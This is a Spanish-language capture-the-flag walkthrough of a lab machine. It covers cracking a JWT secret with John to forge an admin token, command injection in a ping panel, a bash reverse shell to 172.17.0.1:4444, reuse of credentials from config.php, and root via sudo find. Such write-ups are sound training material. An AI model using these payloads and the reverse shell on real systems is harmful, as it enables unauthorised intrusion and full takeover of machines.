## Reconocimiento:

Puerto 22 : SSH

Puerto 80 : HTTP

En la web hay un panel de login. Intento una SQLI con Sqlmap y no es venerable. Pero inspeccionando el código nos da un mensaje con las credenciales para el usuario guest:

```bash
guest:guest
```

En el dashboard de guest no se puede hacer mucho. Buscando un rato veo que al intentar acceder al panel de admin genera un token JWT.

Utilizaré un depurador para manipularlo:

```bash
www.jwt.io
```

Vemos que cifra los datos con un algoritmo HS256, no cifra datos y lo puedes decodear. Le hare fuerza bruta utilizando John:

```bash
echo "<TOKEN>" > jwt.txt
```

Teniendo el token y conociendo el algoritmo, creo el comando:

```bash
john --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt
```

Encuentro la key:

```bash
batman
```

Ahora lo encodeo con la key y cambiando los datos:

```bash
{
	"user": "admin",
	"role": "admin",
	"iat": "1781534594",
}
```

Copio el resultado y lo cambio con las devtools y al recargar la web obtengo acceso al panel de admin.

Dentro hay un panel para hacer ping a una máquina. Es obvio que la vulnerabilidad es un RCE concatenando comandos con un caracter despues del input:

```bash
8.8.8.8 ; whoami
# info:
www-data
```

Confirmo. Toca mandarnos una rev shell.

Primero me pongo en escucha:

```bash
nc -lnvp 4444
```

Y mando el payload:

```bash
8.8.8.8 ; bash -c "bash -i &> /dev/tcp/172.17.0.1/4444 0>&1"
```

Recibo una conexión.

## Escalada www-data → bruce

Entramos por la carpeta /var/www/html donde hay un archivo interesante:

```bash
cat config.php
```

Están las credenciales del usuario bruce:

```bash
bruce : Arkh4m_Kn1ght!
```

## Escalada bruce → root

```bash
sudo -l
(root) NOPASSWD: /usr/bin/find
```

Gracias GTFO Bins:

```bash
sudo find . -exec /bin/bash \; -quit
```

Listo.
